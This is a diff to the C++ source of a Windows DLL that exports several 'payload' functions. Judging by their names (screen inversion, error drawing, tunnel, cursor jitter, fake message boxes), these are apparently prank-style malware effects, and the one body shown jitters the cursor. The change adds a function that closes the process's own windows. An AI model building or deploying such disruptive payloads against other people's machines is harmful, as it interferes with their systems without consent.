@@ -1,10 +1,12 @@
 #include <Windows.h>
 
 #define PAYLOAD extern "C" __declspec(dllexport) void
+#define ACTION PAYLOAD
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID unused);
 LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
+BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
 
 PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style);
 PAYLOAD payloadReverseText();
@@ -14,6 +16,8 @@ PAYLOAD payloadTunnel();
 PAYLOAD payloadDrawErrors();
 PAYLOAD payloadInvertScreen();
 PAYLOAD payloadCursor(int power);
+
+ACTION clearWindows();
 
 void strReverseW(LPWSTR str);
 int random();
@@ -132,6 +136,18 @@ PAYLOAD payloadCursor(int power) {
 	GetCursorPos(&cursor);
 
 	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (power)), cursor.y + (random() % 3 - 1) * (random() % (power)));
+}
+
+ACTION clearWindows() {
+	EnumWindows(&CleanWindowsProc, NULL);
+}
+
+BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
+	DWORD pid;
+	if (GetWindowThreadProcessId(hwnd, &pid) && pid == GetCurrentProcessId()) {
+		SendMessage(hwnd, WM_CLOSE, 0, 0);
+	}
+	return TRUE;
 }
 
 void strReverseW(LPWSTR str) {
